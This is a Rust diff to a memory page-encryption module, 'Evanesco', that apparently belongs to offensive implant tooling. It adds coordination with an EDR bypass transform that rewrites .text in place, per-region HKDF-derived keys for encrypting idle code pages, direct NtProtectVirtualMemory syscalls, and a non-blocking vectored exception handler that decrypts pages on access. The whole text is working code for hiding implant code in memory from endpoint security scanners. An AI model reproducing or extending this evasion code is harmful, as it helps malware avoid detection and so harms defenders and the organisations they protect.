@@ -58,7 +58,9 @@ use chacha20poly1305::{
     aead::{Aead, KeyInit, OsRng},
     XChaCha20Poly1305, XNonce,
 };
+use hkdf::Hkdf;
 use rand::RngCore;
+use sha2::Sha256;
 use std::collections::HashMap;
 use std::ptr;
 use std::sync::atomic::{AtomicBool, AtomicPtr, AtomicU64, AtomicUsize, Ordering};
@@ -110,6 +112,38 @@ static PAGE_SIZE: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
 
 /// Cached page mask for alignment (e.g. `!0xFFF` for 4 KB pages).
 static PAGE_MASK: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+
+// ── EDR transform coordination (MED-009) ─────────────────────────────────────
+//
+// When `run_edr_bypass_transform()` is modifying .text in-place, the
+// Evanesco background thread and `encrypt_all()` must not encrypt/decrypt
+// pages concurrently — even though `freeze_threads()` already suspends the
+// background thread.  This flag provides defense-in-depth: if a new
+// encryption path is added later that doesn't go through the thread-freeze
+// path, it will still see this flag and defer.
+//
+// The flag is set by `edr_bypass_transform` before freezing threads and
+// cleared after thawing.  `encrypt_all()` and `background_loop()` check it
+// before each encryption cycle and skip/defer if set.
+
+/// `true` while an EDR bypass transform cycle is in progress.
+static TRANSFORM_IN_PROGRESS: AtomicBool = AtomicBool::new(false);
+
+/// Mark that an EDR bypass transform cycle is starting or finishing.
+///
+/// Called by `edr_bypass_transform::run_edr_bypass_transform()` before
+/// freezing threads (set `true`) and after thawing (set `false`).
+pub fn set_transform_in_progress(active: bool) {
+    TRANSFORM_IN_PROGRESS.store(active, Ordering::SeqCst);
+}
+
+/// Returns `true` if an EDR bypass transform cycle is currently in progress.
+///
+/// Checked by `encrypt_all()` and the Evanesco background loop to defer
+/// page encryption while .text is being modified.
+pub fn is_transform_in_progress() -> bool {
+    TRANSFORM_IN_PROGRESS.load(Ordering::SeqCst)
+}
 
 /// Return the system page size, querying it on first call.
 ///
@@ -206,6 +240,55 @@ fn random_aead_key() -> [u8; AEAD_KEY_LEN] {
     let mut key = [0u8; AEAD_KEY_LEN];
     OsRng.fill_bytes(&mut key);
     key
+}
+
+// ── MED-013: Per-region HKDF key derivation ──────────────────────────────────
+//
+// Instead of using fully independent random keys for each page, derive each
+// region's XChaCha20-Poly1305 key from a single master key using HKDF-SHA256
+// with the region's base address and size as domain-separation context.  This
+// provides:
+//
+//   1. Cryptographic domain separation — compromise of one region's key does
+//      *not* reveal any other region's key (HKDF extraction properties).
+//   2. Auditability — the master key can be rotated in one place.
+//   3. Reproducibility — the key can be re-derived from the master + context
+//      (useful for recovery scenarios).
+
+/// Master key from which all per-region keys are derived via HKDF.
+static MASTER_KEY: OnceLock<[u8; AEAD_KEY_LEN]> = OnceLock::new();
+
+/// Initialise the master key.  Must be called once during `init()`.
+fn init_master_key() -> &'static [u8; AEAD_KEY_LEN] {
+    MASTER_KEY.get_or_init(|| {
+        let mut key = [0u8; AEAD_KEY_LEN];
+        OsRng.fill_bytes(&mut key);
+        key
+    })
+}
+
+/// Derive a per-region XChaCha20-Poly1305 key from the master key.
+///
+/// Uses HKDF-SHA256 with `base || size` as the info parameter and the
+/// domain-separation constant `hkdf_info::EVANESCO_REGION_KEY` as the
+/// HKDF salt.  Each region gets a cryptographically independent key —
+/// compromising one region's key does not help recover any other.
+fn derive_region_key(base: usize, size: usize) -> [u8; AEAD_KEY_LEN] {
+    let master = MASTER_KEY
+        .get()
+        .expect("evanesco: master key not initialised");
+    let salt = common::hkdf_info::EVANESCO_REGION_KEY;
+    let hk = Hkdf::<Sha256>::new(Some(salt), master);
+
+    // info = base.to_be_bytes() || size.to_be_bytes() — 16 bytes on 64-bit.
+    let mut info_buf = [0u8; 16];
+    info_buf[..8].copy_from_slice(&(base as u64).to_be_bytes());
+    info_buf[8..].copy_from_slice(&(size as u64).to_be_bytes());
+
+    let mut region_key = [0u8; AEAD_KEY_LEN];
+    hk.expand(&info_buf, &mut region_key)
+        .expect("HKDF-SHA256 expand for region key must succeed");
+    region_key
 }
 
 // ── Page state machine ───────────────────────────────────────────────────────
@@ -419,6 +502,10 @@ fn encrypt_page_unlocked(
     base: usize,
     size: usize,
 ) {
+    // HIGH-006: Track the kernel-adjusted base at function scope so the
+    // re-key logic after the if-let block can access it.
+    let mut kernel_base = base;
+
     if let Some(info) = pages.get_mut(&base) {
         if info.state == PageState::Encrypted {
             return; // already encrypted
@@ -480,7 +567,8 @@ fn encrypt_page_unlocked(
         // Set PAGE_NOACCESS via direct syscall.
         // FIX: BaseAddress and RegionSize are IN/OUT parameters — must use
         // mutable pointers so the kernel can write back the rounded values.
-        let mut kernel_base = base;
+        // HIGH-006: kernel_base is declared at function scope.
+        kernel_base = base;
         let mut kernel_size = size;
         let mut old_prot: u32 = 0;
         let status = unsafe {
@@ -504,6 +592,25 @@ fn encrypt_page_unlocked(
         info.size = kernel_size;
         info.state = PageState::Encrypted;
     }
+
+    // HIGH-006: NtProtectVirtualMemory may adjust the base address to
+    // page-align it.  If the key changed, we must re-key the HashMap entries
+    // so that subsequent lookups by the new base address succeed.
+    if kernel_base != base {
+        if let Some(mut entry) = pages.remove(&base) {
+            let new_key = entry.base;
+            let crypto = crypto_sidecar.remove(&base);
+            tracing::debug!(
+                "evanesco: encrypt re-keying page {:#x} → {:#x} after kernel adjustment",
+                base,
+                new_key,
+            );
+            pages.insert(new_key, entry);
+            if let Some(c) = crypto {
+                crypto_sidecar.insert(new_key, c);
+            }
+        }
+    }
 }
 
 /// Decrypt a single page region and set the requested protection.
@@ -518,6 +625,10 @@ fn decrypt_page_unlocked(
     size: usize,
     access: AccessType,
 ) -> bool {
+    // HIGH-006: Track the kernel-adjusted base at function scope so the
+    // re-key logic after the if-let block can access it.
+    let mut kernel_base = base;
+
     if let Some(info) = pages.get_mut(&base) {
         if info.state != PageState::Encrypted {
             // Already decrypted — just update access time.
@@ -536,7 +647,7 @@ fn decrypt_page_unlocked(
                 );
                 // No crypto metadata — page is unrecoverable.  Zero it.
                 // First change protection so we can write.
-                let mut kernel_base = base;
+                kernel_base = base;
                 let mut kernel_size = size;
                 let mut old_prot: u32 = 0;
                 unsafe {
@@ -558,7 +669,8 @@ fn decrypt_page_unlocked(
         // First change protection so we can write to the page.
         let new_prot = access.to_protect();
         // FIX: BaseAddress and RegionSize are IN/OUT — mutable pointers.
-        let mut kernel_base = base;
+        // HIGH-006: kernel_base is declared at function scope.
+        kernel_base = base;
         let mut kernel_size = size;
         let mut old_prot: u32 = 0;
         let status = unsafe {
@@ -622,9 +734,32 @@ fn decrypt_page_unlocked(
 
         info.state = access.to_state();
         info.last_access = Instant::now();
-        return true;
+        // Note: kernel_base was set earlier via NtProtectVirtualMemory; the
+        // re-key check below uses the captured `kernel_base` value.
     }
-    false
+
+    // HIGH-006: NtProtectVirtualMemory may adjust the base address to
+    // page-align it.  Re-key the HashMap entries if the base changed, so
+    // subsequent lookups by the new base succeed (VEH handler, background
+    // thread, acquire_pages, etc.).
+    if kernel_base != base {
+        if let Some(mut entry) = pages.remove(&base) {
+            let new_key = entry.base;
+            let crypto = crypto_sidecar.remove(&base);
+            tracing::debug!(
+                "evanesco: decrypt re-keying page {:#x} → {:#x} after kernel adjustment",
+                base,
+                new_key,
+            );
+            pages.insert(new_key, entry);
+            if let Some(c) = crypto {
+                crypto_sidecar.insert(new_key, c);
+            }
+        }
+        true
+    } else {
+        pages.contains_key(&base)
+    }
 }
 
 // ── PageTracker ──────────────────────────────────────────────────────────────
@@ -670,6 +805,9 @@ pub fn init(idle_threshold_ms: u64, scan_interval_ms: u64) -> Result<()> {
         let _ = PAGE_SIZE.set(sz);
         let _ = PAGE_MASK.set(!(sz - 1));
     }
+
+    // MED-013: Initialise the master key for per-region HKDF derivation.
+    init_master_key();
 
     let inner = Arc::new(PageTrackerInner {
         pages: RwLock::new(HashMap::new()),
@@ -973,47 +1111,117 @@ unsafe extern "system" fn veh_handler(
     // Quick check: page-align the fault address and see if it's tracked.
     let page_base = fault_addr & page_mask();
 
-    // L-2: Remember whether the page was present under the read lock so we
-    // can distinguish "never tracked" from "disappeared between locks" in
-    // the write-lock path below.  If another thread (background re-key or
-    // concurrent VEH handler) removed the entry between our read and write
-    // locks, the page is already being handled and we should retry the
-    // faulting instruction rather than propagating the exception.
+    // HIGH-005: The VEH handler runs in exception context (the faulting
+    // thread's context).  Blocking on an RwLock here can deadlock if the
+    // lock holder is preempted or if the faulting thread itself holds the
+    // lock (e.g., the fault occurs inside a lock-holding code path on
+    // another page).  Use non-blocking try_read / try_write instead.
+    //
+    // If the lock is contended we return EXCEPTION_CONTINUE_EXECUTION,
+    // which re-executes the faulting instruction.  The OS will deliver
+    // another STATUS_ACCESS_VIOLATION and call this handler again.  The
+    // lock will be available eventually (the background thread releases
+    // periodically).  A small bounded spin avoids unbounded re-faulting.
+    const MAX_VEH_SPINS: u32 = 64;
+    let mut spin = 0;
+
+    // Phase 1: non-blocking read to check if the page is tracked.
     let mut was_tracked = false;
-    {
-        // CRIT-004: recover from poison — the VEH handler must still
-        // function after a previous panic to decrypt pages on access.
-        let pages = inner.pages.read_recover();
-        was_tracked = pages.contains_key(&page_base);
-        if !was_tracked {
-            return EXCEPTION_CONTINUE_SEARCH;
-        }
-    } // release read lock before write
-
-    // Decrypt the page.
-    let mut pages = inner.pages.write_recover();
-    let mut crypto_sidecar = inner.crypto_sidecar.write_recover();
-
-    let size = match pages.get(&page_base) {
-        Some(i) => i.size,
-        None => {
-            // Page was present under the read lock but disappeared before we
-            // acquired the write lock.  Another thread (e.g. background
-            // re-keying or a concurrent VEH handler on the same page) already
-            // took care of it.  Retry the faulting instruction — the page is
-            // either decrypted or will re-fault at its new address.
-            if was_tracked {
-                return EXCEPTION_CONTINUE_EXECUTION;
+    loop {
+        match inner.pages.try_read() {
+            Ok(guard) => {
+                was_tracked = guard.contains_key(&page_base);
+                if !was_tracked {
+                    return EXCEPTION_CONTINUE_SEARCH;
+                }
+                break;
             }
+            Err(std::sync::TryLockError::WouldBlock) => {
+                spin += 1;
+                if spin >= MAX_VEH_SPINS {
+                    // Lock is held too long.  Return CONTINUE_EXECUTION so
+                    // the faulting instruction retries; if the page is still
+                    // NOACCESS it will re-fault and re-enter this handler.
+                    return EXCEPTION_CONTINUE_EXECUTION;
+                }
+                // Busy-wait with a compiler barrier.  In VEH context we
+                // cannot call std::thread::yield_now() (it may allocate or
+                // touch locked runtime state).  A spin pause is safe.
+                #[cfg(target_arch = "x86_64")]
+                std::arch::asm!("pause", options(nostack, preserves_flags));
+                #[cfg(target_arch = "aarch64")]
+                std::arch::asm!("yield", options(nostack, preserves_flags));
+            }
+            Err(std::sync::TryLockError::Poisoned(p)) => {
+                // Poisoned — recover and proceed.  The guard from
+                // into_inner() is not a lock guard; just extract the data.
+                drop(p);
+                // Retry with write_recover path below — poison recovery
+                // requires write access which we handle in phase 2.
+                break;
+            }
+        }
+    } // release read lock
+
+    // Phase 2: non-blocking write to decrypt the page.
+    spin = 0;
+    loop {
+        let mut pages = match inner.pages.try_write() {
+            Ok(guard) => guard,
+            Err(std::sync::TryLockError::WouldBlock) => {
+                spin += 1;
+                if spin >= MAX_VEH_SPINS {
+                    return EXCEPTION_CONTINUE_EXECUTION;
+                }
+                #[cfg(target_arch = "x86_64")]
+                std::arch::asm!("pause", options(nostack, preserves_flags));
+                #[cfg(target_arch = "aarch64")]
+                std::arch::asm!("yield", options(nostack, preserves_flags));
+                continue;
+            }
+            Err(std::sync::TryLockError::Poisoned(_)) => {
+                // Poisoned — recover and proceed.
+                inner.pages.write_recover()
+            }
+        };
+
+        let mut crypto_sidecar = match inner.crypto_sidecar.try_write() {
+            Ok(guard) => guard,
+            Err(std::sync::TryLockError::WouldBlock) => {
+                // Release pages lock and retry the entire outer loop.
+                drop(pages);
+                spin += 1;
+                if spin >= MAX_VEH_SPINS {
+                    return EXCEPTION_CONTINUE_EXECUTION;
+                }
+                #[cfg(target_arch = "x86_64")]
+                std::arch::asm!("pause", options(nostack, preserves_flags));
+                #[cfg(target_arch = "aarch64")]
+                std::arch::asm!("yield", options(nostack, preserves_flags));
+                continue;
+            }
+            Err(std::sync::TryLockError::Poisoned(_)) => inner.crypto_sidecar.write_recover(),
+        };
+
+        let size = match pages.get(&page_base) {
+            Some(i) => i.size,
+            None => {
+                // Page was present under the read lock but disappeared before
+                // we acquired the write lock.  Another thread already handled
+                // it.  Retry the faulting instruction.
+                if was_tracked {
+                    return EXCEPTION_CONTINUE_EXECUTION;
+                }
+                return EXCEPTION_CONTINUE_SEARCH;
+            }
+        };
+
+        if decrypt_page_unlocked(&mut pages, &mut crypto_sidecar, page_base, size, access) {
+            inner.decrypt_count.fetch_add(1, Ordering::Relaxed);
+            return EXCEPTION_CONTINUE_EXECUTION;
+        } else {
             return EXCEPTION_CONTINUE_SEARCH;
         }
-    };
-
-    if decrypt_page_unlocked(&mut pages, &mut crypto_sidecar, page_base, size, access) {
-        inner.decrypt_count.fetch_add(1, Ordering::Relaxed);
-        EXCEPTION_CONTINUE_EXECUTION
-    } else {
-        EXCEPTION_CONTINUE_SEARCH
     }
 }
 
@@ -1045,14 +1253,24 @@ fn background_loop(inner: &Arc<PageTrackerInner>) {
             break;
         }
 
-        let scan_ms = inner.scan_interval_ms.load(Ordering::Relaxed);
+        let scan_ms = inner.scan_interval_ms.load(Ordering::Acquire);
         std::thread::sleep(std::time::Duration::from_millis(scan_ms));
 
         if inner.shutdown.load(Ordering::SeqCst) {
             break;
         }
 
-        let threshold_ms = inner.idle_threshold_ms.load(Ordering::Relaxed);
+        // MED-009: defer re-encryption while an EDR bypass transform cycle
+        // is modifying .text.  The transform will re-trigger encryption via
+        // sleep_obfuscation when it finishes if needed.
+        if is_transform_in_progress() {
+            tracing::debug!(
+                "evanesco: background loop deferred — EDR bypass transform in progress"
+            );
+            continue;
+        }
+
+        let threshold_ms = inner.idle_threshold_ms.load(Ordering::Acquire);
         let now = Instant::now();
 
         // Collect pages to re-encrypt under read lock.
@@ -1112,7 +1330,9 @@ pub fn enroll(base: *mut u8, size: usize, orig_protect: u32, label: &str) -> Res
         base: aligned_base,
         size: aligned_size,
         state: PageState::Encrypted, // will be encrypted below
-        aead_key: random_aead_key(),
+        // MED-013: Per-region key derived from master via HKDF-SHA256,
+        // using base + size as domain-separation context.
+        aead_key: derive_region_key(aligned_base, aligned_size),
         key_locked: false,
         last_access: Instant::now(),
         orig_protect,
@@ -1211,6 +1431,14 @@ pub fn encrypt_all() {
         None => return,
     };
 
+    // MED-009: defer encryption while an EDR bypass transform cycle is
+    // modifying .text.  The transform will re-trigger encryption via
+    // sleep_obfuscation when it finishes if needed.
+    if is_transform_in_progress() {
+        tracing::debug!("evanesco: encrypt_all deferred — EDR bypass transform in progress");
+        return;
+    }
+
     // Collect current page info first — we cannot iterate the HashMap while
     // mutating keys.  NtProtectVirtualMemory may adjust the base address
     // (kernel rounds to page boundary), which changes the HashMap key.
@@ -1279,7 +1507,7 @@ pub fn decrypt_minimum() {
 /// Update the idle threshold at runtime.
 pub fn set_idle_threshold(ms: u64) {
     if let Some(inner) = GLOBAL_TRACKER.get() {
-        inner.idle_threshold_ms.store(ms, Ordering::Relaxed);
+        inner.idle_threshold_ms.store(ms, Ordering::Release);
         tracing::info!("evanesco: idle threshold updated to {}ms", ms);
     }
 }
